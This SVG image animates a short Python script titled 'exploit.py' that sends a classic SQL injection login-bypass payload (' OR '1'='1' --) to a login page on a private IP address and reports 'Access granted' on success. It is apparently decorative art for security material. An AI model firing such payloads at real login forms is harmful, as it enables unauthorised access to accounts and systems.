<svg xmlns="http://www.w3.org/2000/svg" width="760" height="250" viewBox="0 0 760 250">
  <!-- Editor frame -->
  <rect x="10" y="10" width="740" height="230" rx="10" fill="#0d1117" stroke="#FF6A00" stroke-width="1.5"/>
  <text x="30" y="42" font-family="monospace" font-size="14" fill="#8b949e">exploit.py</text>
  <rect x="88" y="28" width="18" height="18" rx="3" fill="#FF6A00"/>
  <text x="91" y="42" fill="#0d1117" font-size="12" font-family="monospace">▶</text>

  <!-- Line numbers -->
  <g font-family="monospace" font-size="15" fill="#3d444d">
    <text x="30" y="80">1</text>
    <text x="30" y="107">2</text>
    <text x="30" y="134">3</text>
    <text x="30" y="161">4</text>
    <text x="30" y="188">5</text>
    <text x="30" y="215">6</text>
  </g>

  <!-- Line 1: import requests -->
  <g font-family="monospace" font-size="15">
    <text x="60" y="80" fill="#ff7b72">import</text>
    <text x="130" y="80" fill="#79c0ff">requests</text>
    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.08;1" dur="8s" repeatCount="indefinite"/>
  </g>

  <!-- Line 2: target = "http://192.168.1.10/login" -->
  <g font-family="monospace" font-size="15">
    <text x="60" y="107" fill="#79c0ff">target</text>
    <text x="135" y="107" fill="#ff7b72">=</text>
    <text x="150" y="107" fill="#a5d6ff">"http://192.168.1.10/login"</text>
    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.2;1" dur="8s" begin="0.6s" repeatCount="indefinite"/>
  </g>

  <!-- Line 3: payload = "' OR '1'='1' --" -->
  <g font-family="monospace" font-size="15">
    <text x="60" y="134" fill="#79c0ff">payload</text>
    <text x="140" y="134" fill="#ff7b72">=</text>
    <text x="155" y="134" fill="#a5d6ff">"' OR '1'='1' --"</text>
    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.34;1" dur="8s" begin="1.2s" repeatCount="indefinite"/>
  </g>

  <!-- Line 4: r = requests.post(target, data={"user": payload}) -->
  <g font-family="monospace" font-size="15">
    <text x="60" y="161" fill="#79c0ff">r</text>
    <text x="75" y="161" fill="#ff7b72">=</text>
    <text x="90" y="161" fill="#79c0ff">requests</text>
    <text x="165" y="161" fill="#ffa657">.post</text>
    <text x="225" y="161" fill="#ffa657">(target, data=</text>
    <text x="370" y="161" fill="#ff7b72">{</text>
    <text x="385" y="161" fill="#a5d6ff">"user"</text>
    <text x="425" y="161" fill="#ff7b72">:</text>
    <text x="440" y="161" fill="#79c0ff">payload</text>
    <text x="515" y="161" fill="#ff7b72">})</text>
    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.5;1" dur="8s" begin="1.8s" repeatCount="indefinite"/>
  </g>

  <!-- Line 5: if "Welcome" in r.text: -->
  <g font-family="monospace" font-size="15">
    <text x="60" y="188" fill="#ff7b72">if</text>
    <text x="85" y="188" fill="#a5d6ff">"Welcome"</text>
    <text x="175" y="188" fill="#ff7b72">in</text>
    <text x="200" y="188" fill="#79c0ff">r.text</text>
    <text x="265" y="188" fill="#ff7b72">:</text>
    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.64;1" dur="8s" begin="2.4s" repeatCount="indefinite"/>
  </g>

  <!-- Line 6: print("[+] Access granted!") -->
  <g font-family="monospace" font-size="15">
    <text x="90" y="215" fill="#79c0ff">print</text>
    <text x="150" y="215" fill="#ffa657">(</text>
    <text x="160" y="215" fill="#a5d6ff">"[+] Access granted!"</text>
    <text x="315" y="215" fill="#ffa657">)</text>
    <animate attributeName="opacity" values="0;1;1" keyTimes="0;0.78;1" dur="8s" begin="3s" repeatCount="indefinite"/>
  </g>

  <!-- Blinking cursor -->
  <text x="400" y="215" font-family="monospace" font-size="15" fill="#FF6A00">▌
    <animate attributeName="opacity" values="1;0;1" dur="1s" repeatCount="indefinite"/>
  </text>
</svg>
